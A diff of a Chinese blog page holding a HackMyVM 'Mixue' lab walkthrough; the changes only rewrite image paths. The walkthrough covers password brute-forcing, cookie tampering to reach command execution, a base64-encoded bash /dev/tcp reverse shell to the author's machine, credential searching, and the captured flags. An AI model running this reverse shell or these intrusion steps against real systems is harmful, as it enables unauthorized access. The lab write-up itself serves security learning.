@@ -26,26 +26,26 @@
 <meta property="og:site_name" content="Skyarrow&#39;s blog">
 <meta property="og:description" content="依旧是群友靶机，拿到了userflag。 信息收集 靶机IP：192.168.56.111 nmap扫描： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071nmap -T4 -A -">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/msedge_7H4HhqpYqr.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/msedge_1oQe7pg8Ml.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/msedge_JR99D6bdwi.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/msedge_jADNL7YC98.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/cloudmusic_IhiBFmk2dF.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/cloudmusic_ltgAq89VSv.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/vmware_S84Qap74no.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/vmware_KHM0f4USVO.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/vmware_zcOCN7ZY6t.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/vmware_68zlsw62PB.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/vmware_AtOdFU3jAW.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/vmware_06SrqTk8u7.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Mixue/vmware_yJ01QP8MRl.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/msedge_7H4HhqpYqr.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/msedge_1oQe7pg8Ml.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/msedge_JR99D6bdwi.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/msedge_jADNL7YC98.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/cloudmusic_IhiBFmk2dF.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/cloudmusic_ltgAq89VSv.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/vmware_S84Qap74no.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/vmware_KHM0f4USVO.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/vmware_zcOCN7ZY6t.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/vmware_68zlsw62PB.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/vmware_AtOdFU3jAW.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/vmware_06SrqTk8u7.png">
+<meta property="og:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/vmware_yJ01QP8MRl.png">
 <meta property="article:published_time" content="2025-06-02T14:54:59.000Z">
 <meta property="article:modified_time" content="2025-06-02T16:06:31.973Z">
 <meta property="article:author" content="Skyarrow">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="HVM">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/HackMyVM-Mixue/msedge_7H4HhqpYqr.png">
+<meta name="twitter:image" content="http://example.com/2025/06/02/HackMyVM-Mixue/msedge_7H4HhqpYqr.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -328,37 +328,37 @@
 
 <p>开放了22和80端口，经典的index，login，dashboard三件套，还有个uploads，一开始我以为是可以自己传恶意文件上去的，后来发现想多了。</p>
 <p>访问index.html，是个静态页面，什么东西都不能点，底下的发送email订阅也只是个架子，没法真的发东西。</p>
-<p><img src="/HackMyVM-Mixue/msedge_7H4HhqpYqr.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/msedge_7H4HhqpYqr.png" srcset="/img/loading.gif" lazyload></p>
 <p>再访问&#x2F;uploads&#x2F;，同样的空界面，没有上传按钮，源码没东西。</p>
-<p><img src="/HackMyVM-Mixue/msedge_1oQe7pg8Ml.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/msedge_1oQe7pg8Ml.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr>
 <p>只能访问login了，是个经典的登录界面，用admin试试常见的字典，没有成功。</p>
-<p><img src="/HackMyVM-Mixue/msedge_JR99D6bdwi.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/msedge_JR99D6bdwi.png" srcset="/img/loading.gif" lazyload></p>
 <p>这时候我们回看index的最底下，有个sublarge的邮箱，通常情况下，这就是网站管理员的账户邮箱，我们换上sublarge的用户名再爆破一次，得到使用了弱口令123456，成功登录。</p>
 <p>（其实这里不光有admin和sublarge账户，还有一些弱口令比如test，guest账户，不过权限都是wwwdata，没有区别）</p>
-<p><img src="/HackMyVM-Mixue/msedge_jADNL7YC98.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/msedge_jADNL7YC98.png" srcset="/img/loading.gif" lazyload></p>
 <p>又提示我们没有管理员权限，抓包查看，发现管理员权限是通过cookie管理的。</p>
-<p><img src="/HackMyVM-Mixue/cloudmusic_IhiBFmk2dF.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/cloudmusic_IhiBFmk2dF.png" srcset="/img/loading.gif" lazyload></p>
 <p>修改cookie，得到一个命令执行界面，反弹shell到我们的主机上。</p>
-<p><img src="/HackMyVM-Mixue/cloudmusic_ltgAq89VSv.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/cloudmusic_ltgAq89VSv.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure>
 
-<p><img src="/HackMyVM-Mixue/vmware_S84Qap74no.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/vmware_S84Qap74no.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><hr>
 <p>拿到webshell之后先看看本地目录下有没有什么能用的东西，可惜没有。</p>
 <p>这里的admin密码比较复杂，没法通过一般的字典爆出来，搞得我以为是ssh的密码浪费挺多时间的。</p>
-<p><img src="/HackMyVM-Mixue/vmware_KHM0f4USVO.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/vmware_KHM0f4USVO.png" srcset="/img/loading.gif" lazyload></p>
 <p>再看一下&#x2F;home下面的用户，这里已经初见端倪了，有个用户组是属于root的。</p>
-<p><img src="/HackMyVM-Mixue/vmware_zcOCN7ZY6t.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/vmware_zcOCN7ZY6t.png" srcset="/img/loading.gif" lazyload></p>
 <p>看一下他名下的文件，第一个文件拿到sublarge的ssh登录密码。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user suraxddq 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
 
-<p><img src="/HackMyVM-Mixue/vmware_68zlsw62PB.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/HackMyVM-Mixue/vmware_AtOdFU3jAW.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/vmware_68zlsw62PB.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/vmware_AtOdFU3jAW.png" srcset="/img/loading.gif" lazyload></p>
 <p>事实上如果没有发现，也可以使用grep暴力获取。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;sublarge&quot;</span> -r -n / 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
 
-<p><img src="/HackMyVM-Mixue/vmware_06SrqTk8u7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/vmware_06SrqTk8u7.png" srcset="/img/loading.gif" lazyload></p>
 <p>ssh登录到sublarge上获取userflag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh sublarge@192.168.56.111<br>sublarge@192.168.56.111<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Mixue 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">sublarge@Mixue:~$ ls</span><br><span class="hljs-string">user.txt</span><br><span class="hljs-string">sublarge@Mixue:~$ cat user.txt </span><br><span class="hljs-string">flag&#123;user-88c71208-3bbd-11f0-b2d7-000c2955ba04&#125;</span><br></code></pre></td></tr></table></figure>
 
@@ -377,7 +377,7 @@
 <p>利用链很清晰了，现在唯一的难点在于如何拿到修改key，也就是suraxddq的权限。</p>
 <p>很简单，两个用户密码相同。（唉）</p>
 <p>（事实上，所有用户包括root都是这个密码）（唉唉）</p>
-<p><img src="/HackMyVM-Mixue/vmware_yJ01QP8MRl.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/02/HackMyVM-Mixue/vmware_yJ01QP8MRl.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tmpfile-5.0# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-8b360934-3bae-11f0-b977-000c2955ba04&#125;<br></code></pre></td></tr></table></figure>
 
 <p>这个靶场的难度真的是非常简单了，千万注意信息收集和密码复用。</p>
